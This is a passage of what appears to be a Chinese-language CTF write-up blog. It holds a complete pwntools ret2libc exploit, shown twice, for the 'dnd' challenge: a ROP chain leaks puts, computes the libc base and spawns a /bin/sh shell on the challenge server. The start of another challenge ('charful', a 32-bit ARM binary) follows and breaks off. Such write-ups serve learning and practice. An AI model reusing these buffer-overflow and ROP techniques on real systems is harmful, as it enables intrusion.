style="color:#B56959">Points: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    points </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959"> | Health: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> get_point</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> res </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> i</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Do you want to [a]ttack or [r]un? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">r</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            break</span><br><br><span style="color:#393A34">get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># 0x0000000000402640: pop rdi; nop; pop rbp; ret;</span><br><span style="color:#A0ADA0"># 0x000000000040201a: ret;</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">402640</span><br><span style="color:#393A34">main </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">402988</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40201a</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">cyclic</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">104</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">puts</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#393A34"> main</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">What is your name, fierce warrior? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io.sendline(payload)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">puts_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> puts_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">87be0</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr</span><br><br><span style="color:#393A34">get_overflow</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">cyclic</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">104</span><span style="color:#999999">,</span><span style="color:#B07D48"> n</span><span style="color:#999999">=</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">What is your name, fierce warrior? </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./dnd_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">dnd.chals.damctf.xyz</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 30813</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x402960</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> get_point</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Attack: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    attack </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> (</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    health </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> health</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> attack </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">=</span><span style="color:#DBD7CAEE"> health</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Do you want to [a]ttack or [r]un?</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    else</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Do you want to [a]ttack or [r]un?</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">>>> Round </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Points: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    points </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> | Health: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> points</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> get_overflow</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Can you survive all 5 rounds?</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">>>> Round </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Points: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    points </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> | Health: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> get_point</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> res </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> i</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Do you want to [a]ttack or [r]un? </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            break</span><br><br><span style="color:#DBD7CAEE">get_overflow</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># 0x0000000000402640: pop rdi; nop; pop rbp; ret;</span><br><span style="color:#758575DD"># 0x000000000040201a: ret;</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">402640</span><br><span style="color:#DBD7CAEE">main </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">402988</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40201a</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">cyclic</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">104</span><span style="color:#666666">,</span><span style="color:#BD976A"> n</span><span style="color:#666666">=</span><span style="color:#4C9A91">8</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">got</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">puts</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">plt</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">puts</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> main</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">What is your name, fierce warrior? </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># io.sendline(payload)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">puts_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> puts_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">87be0</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr</span><br><br><span style="color:#DBD7CAEE">get_overflow</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">cyclic</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">104</span><span style="color:#666666">,</span><span style="color:#BD976A"> n</span><span style="color:#666666">=</span><span style="color:#4C9A91">8</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">What is your name, fierce warrior? </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="charful" class="scroll-target"><a href="#charful"><code class="hash inline-code">#</code>charful</a></h2>
<p>题目给了个压缩包，打开，里面有 main.c, todos.c, todos.h，给了源代码 makefile dockerfile，然后再下载出题人搞的可执行文件，看一下基本信息：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">$</span><span style="color:#B56959"> file</span><span style="color:#B56959"> todos_arm</span><br><span style="color:#59873A">todos_arm:</span><span style="color:#B56959"> ELF</span><span style="color:#B56959"> 32-bit</span><span style="color:#B56959"> LSB</span><span style="color:#B56959"> executable,</span><span style="color:#B56959"> ARM,</span><span style="color:#B56959"> EABI5</span><span style="color:#B56959"> version</span><span style="color:#2F798A"> 1</span><span style="color:#393A34"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">GNU/Linux</span><span style="color:#2993a3">)</span><span style="color:#393A34">, statically linked, </span><span style="color:#B07D48">BuildID</span><span style="color:#2993a3">[</span><span style="color:#B07D48">sha1</span><span style="color:#2993a3">]</span><span style="color:#999999">=</span><span style="color:#B56959">ea22cc12e1971e647ebf3c451feca3cbaf59c926,</span><span style="color:#59873A"> for</span><span style="color:#B56959"> GNU/Linux</span><span style="color:#B56959"> 3.2.0,</span><span style="color:#B56959"> not</span><span style="color:#B56959"> stripped</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">$</span><span style="color:#C98A7D"> file</span><span style="color:#C98A7D"> todos_arm</span><br><span style="color:#80A665">todos_arm:</span><span style="color:#C98A7D"> ELF</span><span style="color:#C98A7D"> 32-bit</span><span style="color:#C98A7D"> LSB</span><span style="color:#C98A7D"> executable,</span><span style="color:#C98A7D"> ARM,</span><span style="color:#C98A7D"> EABI5</span><span style="color:#C98A7D"> version</span><span style="color:#4C9A91"> 1</span><span style="color:#DBD7CAEE"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">GNU/Linux</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE">, statically linked, </span><span style="color:#BD976A">BuildID</span><span style="color:#5eaab5">[</span><span style="color:#BD976A">sha1</span><span style="color:#5eaab5">]</span><span style="color:#666666">=</span><span style="color:#C98A7D">ea22cc12e1971e647ebf3c451feca3cbaf59c926,</span><span style="color:#80A665"> for</span><span style="color:#C98A7D"> GNU/Linux</span><span style="color:#C98A7D"> 3.2.0,</span><span style="color:#C98A7D"> not</span><span style="color:#C98A7D"> stripped</span><br></code></pre></div>
<p>ok 32 位 arm，我不知道为什么出题人会给一个复现不了的 dockerfile 出来？给这个 dockerfile 的意义是？我用他的 dockerfile build 出来的可执行文件是这样：</p>
